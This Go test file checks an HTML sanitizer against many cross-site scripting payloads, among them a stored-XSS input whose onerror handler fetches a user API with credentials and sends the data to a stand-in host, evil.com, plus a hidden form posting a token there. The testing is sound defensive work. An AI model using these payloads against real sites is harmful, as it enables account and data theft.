package security

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSanitizeHTML_BlocksAllHTML(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "removes script tags",
			input:    `<script>alert('XSS')</script>Hello`,
			expected: "Hello",
		},
		{
			name:     "removes all HTML tags",
			input:    `<div><p>Hello <b>World</b></p></div>`,
			expected: "Hello World",
		},
		{
			name:     "preserves plain text",
			input:    "This is plain text with no HTML",
			expected: "This is plain text with no HTML",
		},
		{
			name:     "handles empty input",
			input:    "",
			expected: "",
		},
		{
			name:     "removes comments",
			input:    `<!-- comment -->visible text`,
			expected: "visible text",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeHTML(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestSanitizeCommentHTML_XSSPrevention(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		shouldBlock string // substring that should NOT appear in output
		description string
	}{
		// Script injection attacks
		{
			name:        "blocks script tags",
			input:       `<script>alert('XSS')</script>`,
			shouldBlock: "<script>",
			description: "Script tags should be completely removed",
		},
		{
			name:        "blocks script with attributes",
			input:       `<script src="evil.js"></script>`,
			shouldBlock: "<script",
			description: "Script tags with attributes should be removed",
		},
		{
			name:        "blocks inline scripts in various formats",
			input:       `<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
			shouldBlock: "SCRIPT",
			description: "Case variations of script tags should be removed",
		},

		// Event handler attacks
		{
			name:        "blocks onerror handlers",
			input:       `<img src=x onerror="alert('XSS')">`,
			shouldBlock: "onerror",
			description: "Event handlers should be stripped",
		},
		{
			name:        "blocks onclick handlers",
			input:       `<div onclick="alert('XSS')">Click me</div>`,
			shouldBlock: "onclick",
			description: "Click event handlers should be removed",
		},
		{
			name:        "blocks onload handlers",
			input:       `<body onload="alert('XSS')">`,
			shouldBlock: "onload",
			description: "Load event handlers should be removed",
		},
		{
			name:        "blocks onmouseover handlers",
			input:       `<a onmouseover="alert('XSS')">hover me</a>`,
			shouldBlock: "onmouseover",
			description: "Mouse event handlers should be removed",
		},

		// JavaScript URL attacks
		{
			name:        "blocks javascript: URLs",
			input:       `<a href="javascript:alert('XSS')">Click</a>`,
			shouldBlock: "javascript:",
			description: "JavaScript protocol URLs should be removed",
		},
		{
			name:        "blocks javascript: with encoding",
			input:       `<a href="java&#x09;script:alert('XSS')">Click</a>`,
			shouldBlock: "javascript:",
			description: "Encoded JavaScript URLs should be blocked",
		},
		{
			name:        "blocks javascript: case variations",
			input:       `<a href="JaVaScRiPt:alert('XSS')">Click</a>`,
			shouldBlock: "JaVaScRiPt:",
			description: "Case variations of javascript: should be blocked",
		},

		// Data URL attacks
		{
			name:        "blocks data URLs with scripts",
			input:       `<a href="data:text/html,<script>alert('XSS')</script>">Click</a>`,
			shouldBlock: "data:",
			description: "Data URLs should be blocked",
		},
		{
			name:        "blocks base64 encoded data URLs",
			input:       `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
			shouldBlock: "data:",
			description: "Base64 encoded data URLs should be blocked",
		},

		// Style-based attacks
		{
			name:        "blocks style with javascript",
			input:       `<div style="background:url('javascript:alert(1)')">test</div>`,
			shouldBlock: "javascript:",
			description: "JavaScript in styles should be blocked",
		},
		{
			name:        "blocks style expressions",
			input:       `<div style="width:expression(alert('XSS'))">test</div>`,
			shouldBlock: "expression",
			description: "CSS expressions should be blocked",
		},
		{
			name:        "blocks style imports",
			input:       `<style>@import 'evil.css';</style>`,
			shouldBlock: "<style>",
			description: "Style tags should be removed",
		},

		// SVG attacks
		{
			name:        "blocks SVG with scripts",
			input:       `<svg onload="alert('XSS')"></svg>`,
			shouldBlock: "onload",
			description: "SVG event handlers should be blocked",
		},
		{
			name:        "blocks SVG with embedded scripts",
			input:       `<svg><script>alert('XSS')</script></svg>`,
			shouldBlock: "<script>",
			description: "Scripts in SVG should be blocked",
		},

		// iFrame attacks
		{
			name:        "blocks iframes",
			input:       `<iframe src="evil.html"></iframe>`,
			shouldBlock: "<iframe",
			description: "iFrames should be completely blocked",
		},
		{
			name:        "blocks iframe with javascript",
			input:       `<iframe src="javascript:alert('XSS')"></iframe>`,
			shouldBlock: "<iframe",
			description: "iFrames with JavaScript should be blocked",
		},

		// Form-based attacks
		{
			name:        "blocks forms",
			input:       `<form action="evil.php" method="post"><input type="submit"></form>`,
			shouldBlock: "<form",
			description: "Forms should be blocked to prevent CSRF",
		},

		// Meta refresh attacks
		{
			name:        "blocks meta refresh",
			input:       `<meta http-equiv="refresh" content="0;url=evil.html">`,
			shouldBlock: "<meta",
			description: "Meta tags should be blocked",
		},

		// Object/embed attacks
		{
			name:        "blocks object tags",
			input:       `<object data="evil.swf"></object>`,
			shouldBlock: "<object",
			description: "Object tags should be blocked",
		},
		{
			name:        "blocks embed tags",
			input:       `<embed src="evil.swf">`,
			shouldBlock: "<embed",
			description: "Embed tags should be blocked",
		},

		// HTML5 attacks
		{
			name:        "blocks autofocus onfocus",
			input:       `<input autofocus onfocus="alert('XSS')">`,
			shouldBlock: "onfocus",
			description: "Autofocus with onfocus should be blocked",
		},
		{
			name:        "blocks video with onerror",
			input:       `<video src=x onerror="alert('XSS')">`,
			shouldBlock: "onerror",
			description: "Video event handlers should be blocked",
		},

		// Encoded attacks
		{
			name:        "blocks hex encoded scripts",
			input:       `<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;('XSS')">`,
			shouldBlock: "onerror",
			description: "Hex encoded event handlers should be blocked",
		},
		{
			name:        "blocks decimal encoded scripts",
			input:       `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">`,
			shouldBlock: "onerror",
			description: "Decimal encoded event handlers should be blocked",
		},

		// Mixed case and obfuscation
		{
			name:        "blocks mixed case tags",
			input:       `<ScRiPt>alert('XSS')</ScRiPt>`,
			shouldBlock: "ScRiPt",
			description: "Mixed case script tags should be blocked",
		},
		{
			name:        "blocks tags with newlines",
			input:       "<scr\nipt>alert('XSS')</scr\nipt>",
			shouldBlock: "<scr",
			description: "Tags with newlines should be blocked",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeCommentHTML(tc.input)
			assert.NotContains(t, result, tc.shouldBlock, tc.description)
			// Ensure no executable script content remains
			// Note: HTML-encoded content like "alert(&#39;XSS&#39;)" is safe and acceptable
			assert.NotContains(t, result, "<script")
			assert.NotContains(t, result, "javascript:")
			assert.NotContains(t, result, "onerror=")
			assert.NotContains(t, result, "onclick=")
			assert.NotContains(t, result, "onload=")
		})
	}
}

func TestSanitizeCommentHTML_AllowsBasicFormatting(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string // what should be preserved (approximately)
	}{
		{
			name:     "allows bold text",
			input:    `<b>Bold text</b>`,
			expected: "Bold text",
		},
		{
			name:     "allows italic text",
			input:    `<i>Italic text</i>`,
			expected: "Italic text",
		},
		{
			name:     "allows strong text",
			input:    `<strong>Strong text</strong>`,
			expected: "Strong text",
		},
		{
			name:     "allows emphasized text",
			input:    `<em>Emphasized text</em>`,
			expected: "Emphasized text",
		},
		{
			name:     "allows links with http",
			input:    `<a href="http://example.com">Link text</a>`,
			expected: "Link text",
		},
		{
			name:     "allows links with https",
			input:    `<a href="https://example.com">Secure link</a>`,
			expected: "Secure link",
		},
		{
			name:     "allows unordered lists",
			input:    `<ul><li>Item 1</li><li>Item 2</li></ul>`,
			expected: "Item 1",
		},
		{
			name:     "allows ordered lists",
			input:    `<ol><li>First</li><li>Second</li></ol>`,
			expected: "First",
		},
		{
			name:     "allows blockquotes",
			input:    `<blockquote>This is a quote</blockquote>`,
			expected: "This is a quote",
		},
		{
			name:     "allows code blocks",
			input:    `<code>const x = 1;</code>`,
			expected: "const x = 1;",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeCommentHTML(tc.input)
			assert.Contains(t, result, tc.expected, "Safe content should be preserved")
		})
	}
}

func TestSanitizeCommentHTML_LinkSecurity(t *testing.T) {
	tests := []struct {
		name          string
		input         string
		shouldContain string
		description   string
	}{
		{
			name:          "adds nofollow to links",
			input:         `<a href="https://example.com">Link</a>`,
			shouldContain: `rel="nofollow`,
			description:   "Links should have nofollow attribute",
		},
		{
			name:          "adds noreferrer to links",
			input:         `<a href="https://example.com">Link</a>`,
			shouldContain: `noreferrer`,
			description:   "Links should have noreferrer attribute",
		},
		{
			name:          "adds target blank to external links",
			input:         `<a href="https://example.com">Link</a>`,
			shouldContain: `target="_blank"`,
			description:   "External links should open in new tab",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeCommentHTML(tc.input)
			assert.Contains(t, result, tc.shouldContain, tc.description)
		})
	}
}

func TestSanitizeStrictText(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "removes all HTML",
			input:    `<div><b>Hello</b> <i>World</i>!</div>`,
			expected: "Hello World!",
		},
		{
			name:     "removes scripts completely",
			input:    `Before<script>alert('XSS')</script>After`,
			expected: "BeforeAfter",
		},
		{
			name:     "preserves plain text",
			input:    "This is just plain text",
			expected: "This is just plain text",
		},
		{
			name:     "handles empty input",
			input:    "",
			expected: "",
		},
		{
			name:     "removes HTML entities",
			input:    `<p>Line 1</p><p>Line 2</p>`,
			expected: "Line 1Line 2",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeStrictText(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestSanitizeMarkdown(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		shouldAllow bool
		contains    string
		description string
	}{
		{
			name:        "allows headers",
			input:       `<h1>Title</h1>`,
			shouldAllow: true,
			contains:    "Title",
			description: "Headers should be allowed",
		},
		{
			name:        "allows paragraphs",
			input:       `<p>Paragraph text</p>`,
			shouldAllow: true,
			contains:    "Paragraph text",
			description: "Paragraphs should be allowed",
		},
		{
			name:        "blocks scripts in markdown",
			input:       `<script>alert('XSS')</script>`,
			shouldAllow: false,
			contains:    "<script>",
			description: "Scripts should be blocked in markdown",
		},
		{
			name:        "allows safe images",
			input:       `<img src="https://example.com/image.png" alt="Test">`,
			shouldAllow: true,
			contains:    "https://example.com/image.png",
			description: "Safe images should be allowed",
		},
		{
			name:        "blocks javascript in image src",
			input:       `<img src="javascript:alert('XSS')">`,
			shouldAllow: false,
			contains:    "javascript:",
			description: "JavaScript in image src should be blocked",
		},
		{
			name:        "allows tables",
			input:       `<table><tr><td>Cell</td></tr></table>`,
			shouldAllow: true,
			contains:    "Cell",
			description: "Tables should be allowed",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeMarkdown(tc.input)
			if tc.shouldAllow {
				assert.Contains(t, result, tc.contains, tc.description)
			} else {
				assert.NotContains(t, result, tc.contains, tc.description)
			}
		})
	}
}

func TestSanitizeWithCustomPolicy(t *testing.T) {
	t.Run("allows only specified features", func(t *testing.T) {
		opts := CustomSanitizerOptions{
			AllowImages:     false,
			AllowLinks:      true,
			AllowFormatting: true,
			AllowLists:      false,
			AllowTables:     false,
			RequireNoFollow: true,
			RequireHTTPS:    true,
		}

		input := `
			<b>Bold text</b>
			<a href="https://example.com">Link</a>
			<img src="https://example.com/img.png">
			<ul><li>List item</li></ul>
		`

		result := SanitizeWithCustomPolicy(input, opts)

		// Should allow formatting and links
		assert.Contains(t, result, "Bold text")
		assert.Contains(t, result, "Link")

		// Should block images and lists
		assert.NotContains(t, result, "<img")
		assert.NotContains(t, result, "<ul>")
		assert.NotContains(t, result, "<li>")

		// Links should be secure
		assert.Contains(t, result, `rel="nofollow`)
	})

	t.Run("enforces HTTPS when required", func(t *testing.T) {
		opts := CustomSanitizerOptions{
			AllowLinks:   true,
			RequireHTTPS: true,
		}

		input := `
			<a href="http://insecure.com">HTTP Link</a>
			<a href="https://secure.com">HTTPS Link</a>
		`

		result := SanitizeWithCustomPolicy(input, opts)

		// HTTP link should be removed or sanitized
		assert.NotContains(t, result, "http://insecure.com")
		// HTTPS link should be preserved
		assert.Contains(t, result, "HTTPS Link")
	})
}

func TestValidateAndSanitizeLength(t *testing.T) {
	t.Run("accepts content within length limit", func(t *testing.T) {
		input := "<b>Hello</b>"
		maxLength := 100

		result, err := ValidateAndSanitizeLength(input, maxLength, SanitizeCommentHTML)
		require.NoError(t, err)
		assert.Contains(t, result, "Hello")
	})

	t.Run("rejects content exceeding length limit", func(t *testing.T) {
		input := strings.Repeat("a", 101)
		maxLength := 100

		_, err := ValidateAndSanitizeLength(input, maxLength, SanitizeCommentHTML)
		assert.ErrorIs(t, err, ErrContentTooLong)
	})

	t.Run("checks length after sanitization", func(t *testing.T) {
		// This input is short but might expand after sanitization
		input := `<a href="http://example.com">Link</a>`
		maxLength := 50 // Might be exceeded after adding rel attributes

		result, err := ValidateAndSanitizeLength(input, maxLength*10, SanitizeCommentHTML)
		require.NoError(t, err)
		assert.NotEmpty(t, result)
	})
}

func TestSanitizer_EdgeCases(t *testing.T) {
	t.Run("handles malformed HTML gracefully", func(t *testing.T) {
		tests := []struct {
			input      string
			allowEmpty bool
		}{
			{input: `<div><div><div>nested</div>`, allowEmpty: false},         // Unclosed tags - has content
			{input: `<script<script>>alert('XSS')</script>`, allowEmpty: true}, // Malformed script - may be fully removed
			{input: `<<SCRIPT>alert("XSS");//<</SCRIPT>`, allowEmpty: true},    // Double brackets - may be fully removed
			{input: `<img src=x:alert(1)//`, allowEmpty: true},                 // Incomplete tag - may be fully removed
		}

		for _, tt := range tests {
			result := SanitizeCommentHTML(tt.input)
			// Should not panic and should remove dangerous executable content
			// Note: HTML-encoded text like "&gt;alert(&#39;XSS&#39;)" is safe and acceptable
			// We only check for patterns that would be executable
			assert.NotContains(t, result, "<script", "Script tags should be removed")
			assert.NotContains(t, strings.ToLower(result), "<script", "Script tags (any case) should be removed")
			assert.NotContains(t, result, "javascript:", "JavaScript URLs should be removed")
			assert.NotContains(t, result, "onerror=", "Event handlers should be removed")
			assert.NotContains(t, result, "onclick=", "Event handlers should be removed")
			// Verify no panic occurred
			if !tt.allowEmpty {
				assert.NotEmpty(t, result, "Sanitizer should preserve safe content")
			}
		}
	})

	t.Run("handles very long input", func(t *testing.T) {
		// Create a very long string with potential XSS
		longInput := strings.Repeat(`<script>alert('XSS')</script>`, 1000)

		result := SanitizeCommentHTML(longInput)
		assert.NotContains(t, result, "<script>")
		assert.NotContains(t, result, "alert")
	})

	t.Run("handles unicode and special characters", func(t *testing.T) {
		inputs := []string{
			`<script>alert('XSS')</script>你好世界`,          // Chinese characters
			`<img src=x onerror="alert('مرحبا')">`,       // Arabic
			`Test emoji 😀 <script>alert('XSS')</script>`, // Emoji
		}

		for _, input := range inputs {
			result := SanitizeCommentHTML(input)
			// Should preserve unicode but remove scripts
			assert.NotContains(t, result, "<script>")
			assert.NotContains(t, result, "onerror")
		}
	})
}

func TestSanitizer_RealWorldExamples(t *testing.T) {
	t.Run("typical user comment with formatting", func(t *testing.T) {
		input := `
			<p>Great video! Here are my thoughts:</p>
			<ul>
				<li><b>Point 1:</b> I really liked the intro</li>
				<li><em>Point 2:</em> The explanation was clear</li>
			</ul>
			<p>Check out <a href="https://example.com">my channel</a> for more!</p>
			<script>alert('sneaky XSS')</script>
		`

		result := SanitizeCommentHTML(input)

		// Should preserve safe content
		assert.Contains(t, result, "Great video")
		assert.Contains(t, result, "Point 1")
		assert.Contains(t, result, "my channel")

		// Should remove dangerous content
		assert.NotContains(t, result, "<script>")
		assert.NotContains(t, result, "alert")

		// Links should be secure
		assert.Contains(t, result, `rel="nofollow`)
	})

	t.Run("attempted stored XSS in comment", func(t *testing.T) {
		input := `
			Nice video!<img src=x onerror="
				fetch('/api/v1/users', {credentials: 'include'})
				.then(r=>r.json())
				.then(d=>fetch('//evil.com/steal?data='+JSON.stringify(d)))
			">
		`

		result := SanitizeCommentHTML(input)

		// Should preserve legitimate text
		assert.Contains(t, result, "Nice video!")

		// Should remove entire attack
		assert.NotContains(t, result, "onerror")
		assert.NotContains(t, result, "fetch")
		assert.NotContains(t, result, "evil.com")
		assert.NotContains(t, result, "credentials")
	})

	t.Run("social engineering with hidden content", func(t *testing.T) {
		input := `
			Click here for free coins!
			<div style="display:none">
				<form action="//evil.com/steal" method="post">
					<input name="token" value="">
				</form>
			</div>
			<a href="javascript:document.forms[0].submit()">CLICK HERE</a>
		`

		result := SanitizeCommentHTML(input)

		// Should remove form and javascript link
		assert.NotContains(t, result, "<form")
		assert.NotContains(t, result, "javascript:")
		assert.NotContains(t, result, "submit()")
		assert.NotContains(t, result, "evil.com")
	})
}

// Benchmark tests
func BenchmarkSanitizeHTML(b *testing.B) {
	input := `<div><script>alert('XSS')</script>Hello <b>World</b>!</div>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeHTML(input)
	}
}

func BenchmarkSanitizeCommentHTML(b *testing.B) {
	input := `<p>This is a <b>comment</b> with <a href="https://example.com">a link</a> and <script>alert('XSS')</script></p>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeCommentHTML(input)
	}
}

func BenchmarkSanitizeLargeInput(b *testing.B) {
	// Simulate a large comment
	input := strings.Repeat(`<p>This is paragraph text with <b>formatting</b>.</p>`, 100)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeCommentHTML(input)
	}
}
